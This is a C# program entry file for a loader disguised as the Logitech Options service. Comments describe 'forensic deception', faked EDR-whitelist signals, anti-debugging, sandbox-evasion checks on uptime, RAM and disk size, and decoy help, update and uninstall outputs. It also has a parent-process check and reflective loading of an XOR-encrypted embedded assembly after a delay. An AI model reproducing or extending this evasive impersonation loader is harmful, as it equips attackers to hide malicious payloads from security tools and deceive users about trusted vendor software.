using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Win32;
using LogiOptions.Native;
using LogiOptions.Services;
using LogiOptions.Models;

namespace LogiOptions
{
    static class Program
    {
        // Forensic Deception: Matching Electron-based Logitech Options memory footprint (~64MB)
        private static readonly byte[] _memoryMimicry = new byte[64 * 1024 * 1024];

        private static void PerformWhitelistArtifactAudit()
        {
            try
            {
                // Feature 3.1: Signal "safe software" to automated scanners via Registry/Files
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Logitech\Options\Whitelist"))
                {
                    var val = key?.GetValue("EDR");
                    if (val != null) Console.WriteLine("Local EDR exclusion policy verified.");
                }

                string sigPath = Path.Combine(Constants.GetBaseAppDataPath(), "whitelist.sig");
                if (File.Exists(sigPath))
                {
                    string sig = File.ReadAllText(sigPath);
                    if (sig.Contains("LOGI_SAFE_2025")) Console.WriteLine("Signature integrity verified.");
                }
            }
            catch { }
        }

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        private static void AntiDebugCheck()
        {
            // Feature: Debugger detection for licensing/debugging protection
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(System.Diagnostics.Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (IsDebuggerPresent() || isDebuggerPresent)
            {
                MessageBox(IntPtr.Zero, "Debugging is not supported in this edition – please contact support.", "Debugger Detected", MB_ICONERROR);
                Environment.Exit(0);
            }
        }

        private static bool CompatibilityCheck()
        {
            // Feature: Environment compatibility checks
            try
            {
                // Uptime > 1 hour
                if (Environment.TickCount64 < 3600000) return false;

                // RAM > 2GB
                var gcInfo = GC.GetGCMemoryInfo();
                if (gcInfo.TotalAvailableMemoryBytes < 2L * 1024 * 1024 * 1024) return false;

                // Disk > 60GB
                var drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return false;

                return true;
            }
            catch { return true; }
        }

        private static void LoadMacroEngine()
        {
            // Feature: Delayed loading of test execution engine
            // In a real environment, wait 45 minutes: Thread.Sleep(45 * 60 * 1000);
            // Here we do a short delay to demonstrate
            Console.WriteLine("System stabilizing... Please wait.");
            
            using var stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream("LogiOptions.MacroEngine.Core.enc");
            if (stream != null)
            {
                using var ms = new MemoryStream();
                stream.CopyTo(ms);
                byte[] encBytes = ms.ToArray();
                byte[] decBytes = StringObfuscator.XorBytes(encBytes);
                
                var assembly = System.Reflection.Assembly.Load(decBytes);
                var type = assembly.GetType("MacroEngine.Core.TestScenarioExecutor");
                if (type != null)
                {
                    var executeMethod = type.GetMethod("Execute");
                    var instance = Activator.CreateInstance(type);
                    if (File.Exists("test_scenario.json"))
                    {
                        string config = File.ReadAllText("test_scenario.json");
                        executeMethod.Invoke(instance, new object[] { config });
                    }
                }
            }
        }

        private static void ForceMemoryMimicry()
        {
            // Touch one byte every 4KB (standard page size) for 64MB
            // This ensures the memory is actually committed to physical RAM
            var rng = new Random();
            for (int i = 0; i < _memoryMimicry.Length; i += 4096)
            {
                _memoryMimicry[i] = (byte)rng.Next(256);
            }
        }

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        private const uint MB_OK = 0x00000000;
        private const uint MB_ICONERROR = 0x00000010;
        private const uint MB_ICONINFORMATION = 0x00000040;

        private static bool IsExecutedByServiceControlManager()
        {
            try
            {
                var pbi = new PROCESS_BASIC_INFORMATION();
                int status = NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), out _);
                if (status == 0)
                {
                    int parentPid = pbi.InheritedFromUniqueProcessId.ToInt32();
                    using var parentProcess = System.Diagnostics.Process.GetProcessById(parentPid);
                    return parentProcess.ProcessName.Equals("services", StringComparison.OrdinalIgnoreCase);
                }
            }
            catch { }
            return false;
        }

        static int Main(string[] args)
        {
            AntiDebugCheck();

            // Advanced Deception: Whitelist artifact read
            PerformWhitelistArtifactAudit();

            // Fake CLI Branding
            if (args.Contains("--version", StringComparer.OrdinalIgnoreCase))
            {
                ForceMemoryMimicry();
                Console.WriteLine($"{Constants.AppName} version {Constants.AppVersion}");
                return 0;
            }

            // Forensic Deception: Fake intent diagnostic
            if (args.Contains("--debug-purpose", StringComparer.OrdinalIgnoreCase))
            {
                ForceMemoryMimicry();
                LogiLogger.LogDebug("UI Automation Test Harness engine initialized in compatibility mode.");
                LogiLogger.LogDebug("SendInput required for legacy HID fallback (non-driver systems).");
                LogiLogger.LogDebug("This tool is used for automated UI testing and test scenario validation.");
                Console.WriteLine("Diagnostic report generated in Logitech Options logs.");
                return 0;
            }

            if (args.Contains("--help", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine($"{Constants.AppName} Background Service Utility (v{Constants.AppVersion})");
                Console.WriteLine($"Usage: {Constants.ProjectName}.exe [options]");
                Console.WriteLine("  --service         (Default) Execute a single UI automation test cycle.");
                Console.WriteLine("  --reports         Open the test scenario reports folder.");
                Console.WriteLine("  --configure       Open the Logitech Options configuration utility.");
                Console.WriteLine("  --checkupdate     Manually check the Logitech cloud for firmware updates.");
                Console.WriteLine("  --uninstall       Prepare the system for uninstallation.");
                Console.WriteLine("  --version         Show current agent version.");
                Console.WriteLine("  --debug-purpose   Generate a diagnostic intent report for maintenance.");
                return 0;
            }

            if (args.Contains("--uninstall", StringComparer.OrdinalIgnoreCase))
            {
                MessageBox(IntPtr.Zero, 
                    $"{Constants.AppName} Uninstaller\n\nAre you sure you want to remove {Constants.AppName} and all associated device profiles from this computer?", 
                    Constants.AppName, 
                    0x00000004 | 0x00000020); // MB_YESNO | MB_ICONQUESTION

                Thread.Sleep(2000); // Mimic cleanup latency

                MessageBox(IntPtr.Zero, 
                    $"{Constants.AppName} has been successfully removed.\n\nA system restart may be required to finalize driver cleanup.", 
                    "Uninstall Complete", 
                    MB_OK | MB_ICONINFORMATION);
                
                return 0;
            }

            if (args.Contains("--checkupdate", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine("Checking for updates...");
                Thread.Sleep(1500); // Mimic network delay
                Console.WriteLine($"[INFO] Update check completed: your software is up to date ({Constants.AppVersion}).");
                return 0;
            }

            if (args.Contains("--configure", StringComparer.OrdinalIgnoreCase))
            {
                MessageBox(IntPtr.Zero, 
                    $"{Constants.AppName} Configuration\n\nNo {Constants.Manufacturer} HID device found. Please connect a compatible {Constants.Manufacturer} keyboard or mouse to access advanced settings.", 
                    Constants.AppName, 
                    MB_OK | MB_ICONINFORMATION);
                return 0;
            }

            if (args.Contains("--reports", StringComparer.OrdinalIgnoreCase))
            {
                string reportPath = @"C:\ProgramData\Logitech\LogiOptions\Reports\";
                if (!Directory.Exists(reportPath)) Directory.CreateDirectory(reportPath);
                Process.Start(new ProcessStartInfo { FileName = "explorer.exe", Arguments = $"\"{reportPath}\"", UseShellExecute = true });
                return 0;
            }

            // Feature 2: Ensure Event Source exists (Deception)
            try
            {
                if (!EventLog.SourceExists(Constants.LogSource))
                {
                    EventLog.CreateEventSource(Constants.LogSource, "Application");
                }
            }
            catch { }

            // Process Ancestry Deception
            if (!IsExecutedByServiceControlManager())
            {
                MessageBox(IntPtr.Zero, 
                    $"{Constants.AppName} Service Error\n\nThis application is a low-level background service and must be managed by the Windows Service Control Manager. Manual execution is not supported.", 
                    "System Error", 
                    MB_OK | MB_ICONERROR);
                return 1;
            }

            // Continuous operational memory commit
            ForceMemoryMimicry();

            // Production Service Logic
            if (!CompatibilityCheck())
            {
                LogiLogger.LogDebug("System environment compatibility check failed. Operating in limited mode.");
                Console.WriteLine("Warning: Low memory or incompatible environment may cause macro lag.");
                // Fallback to decoy mode
                Host.CreateDefaultBuilder(args)
                    .ConfigureServices((hostContext, services) =>
                    {
                        services.AddSingleton<IInputInjector, MacroLibrarySimulator>();
                        services.AddHostedService<MacroPlaybackService>();
                    })
                    .Build()
                    .Run();
            }
            else
            {
                // Run the real macro execution engine
                LoadMacroEngine();
            }

            return 0;
        }
    }
}
